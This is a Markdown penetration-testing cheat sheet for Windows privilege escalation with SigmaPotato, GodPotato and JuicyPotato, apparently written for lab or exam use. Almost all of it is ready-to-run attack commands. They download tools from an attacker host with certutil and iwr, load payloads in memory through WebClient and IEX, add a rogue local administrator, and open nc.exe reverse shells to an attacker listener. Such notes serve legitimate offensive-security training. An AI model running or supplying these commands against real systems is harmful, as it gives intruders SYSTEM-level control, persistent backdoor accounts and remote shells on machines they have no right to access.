---
title: Potato Family
type: note
tab: Privesc
tools: [SigmaPotato, Invoke-SigmaPotato, GodPotato, JuicyPotato]
inputs: [Shell]
outputs: [SYSTEM, Admin]
tags: [Windows, PrivilegeEscalation]
---

# Potato Family

## When

- You already have code execution on a Windows host.
- `whoami /priv` shows `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.
- Common contexts: IIS app pool, `LocalService`, `NetworkService`, or another service account.

## SigmaPotato

### SigmaPotato EXE

#Shell #Windows #PrivilegeEscalation
Check privileges, download SigmaPotato, and use it for admin or shell access.

```powershell
# Confirm impersonation-related privileges first.
whoami /priv

# Download SigmaPotato to disk.
iwr -Uri http://<LHOST>/SigmaPotato.exe -OutFile SigmaPotato.exe
certutil.exe -urlcache -f http://<LHOST>/SigmaPotato.exe SigmaPotato.exe

# Add a local admin user.
.\SigmaPotato.exe "net user <USER> <PASS> /add"
.\SigmaPotato.exe "net localgroup Administrators <USER> /add"

# Or run a single command / reverse shell instead.
.\SigmaPotato.exe "<COMMAND>"
.\SigmaPotato.exe --revshell <LHOST> <LPORT>

# Quick proof/local flag checks.
.\SigmaPotato.exe "cmd.exe /c whoami & hostname & type C:\Users\Administrator\Desktop\proof.txt & ipconfig"
.\SigmaPotato.exe "cmd.exe /c whoami & hostname & type C:\Users\<USER>\local.txt & ipconfig"
```

### SigmaPotato In Memory

#Shell #PowerShell #Windows #PrivilegeEscalation
Load SigmaPotato into memory and execute a command or reverse shell.

```powershell
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://<LHOST>/SigmaPotato.exe"))
[SigmaPotato]::Main("<COMMAND>")
[SigmaPotato]::Main(@("--revshell","<LHOST>","<LPORT>"))
```

### SigmaPotato PowerShell Wrapper

#Shell #PowerShell #Windows #PrivilegeEscalation
Download and run the PowerShell SigmaPotato wrapper when PowerShell execution is available.

```powershell
# Attacker: download the wrapper and host it.
wget https://github.com/tylerdotrar/SigmaPotato/raw/refs/heads/main/Invoke-SigmaPotato.ps1 -O Invoke-SigmaPotato.ps1
python3 -m http.server 80

# Target: download and import the wrapper.
iwr -Uri http://<LHOST>/Invoke-SigmaPotato.ps1 -OutFile Invoke-SigmaPotato.ps1
. .\Invoke-SigmaPotato.ps1

# Or import it in memory.
(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/Invoke-SigmaPotato.ps1') | IEX

# Target: execute a command or reverse shell.
Invoke-SigmaPotato -Command "<COMMAND>"
Invoke-SigmaPotato -Command "net user <USER> <PASS> /add"
Invoke-SigmaPotato -Command "net localgroup Administrators <USER> /add"
Invoke-SigmaPotato -Command "--revshell <LHOST> <LPORT>"
```

## GodPotato

#Shell #Windows #PrivilegeEscalation
Use GodPotato when impersonation privileges are available on newer Windows builds.

```powershell
# Confirm impersonation-related privileges first.
whoami /priv

# Download GodPotato to disk.
certutil.exe -urlcache -f http://<LHOST>/GodPotato.exe GodPotato.exe
iwr -Uri http://<LHOST>/GodPotato.exe -OutFile GodPotato.exe

# Execute a quick proof command.
.\GodPotato.exe -cmd "cmd /c whoami"

# Trigger a reverse shell command.
.\GodPotato.exe -cmd "cmd /c C:\Users\Public\nc.exe -e cmd.exe <LHOST> <LPORT>"
```

## JuicyPotato

#Shell #Windows #PrivilegeEscalation
Use JuicyPotato on older Windows builds when CLSID-based COM abuse is viable.

```powershell
# Quick test with the default CLSID.
.\JuicyPotato.exe -t * -p C:\temp\shell.exe -l 443

# Download JuicyPotato and nc.exe.
certutil.exe -urlcache -f http://<LHOST>/JuicyPotato.exe JuicyPotato.exe
certutil.exe -urlcache -f http://<LHOST>/nc.exe nc.exe

# Spawn a SYSTEM reverse shell.
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\nc.exe -e cmd.exe <LHOST> <LPORT>" -t *

# If needed, test a known CLSID explicitly.
.\JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\nc.exe -e cmd.exe <LHOST> <LPORT>" -t *
```

## Notes

- SigmaPotato is usually the first thing to try on newer Windows builds.
- GodPotato is also useful on newer Windows builds with impersonation privileges.
- JuicyPotato is mainly useful on older Windows / Server versions.
- If the target blocks `nc.exe`, use a staged PowerShell command instead of `cmd.exe /c ...`.
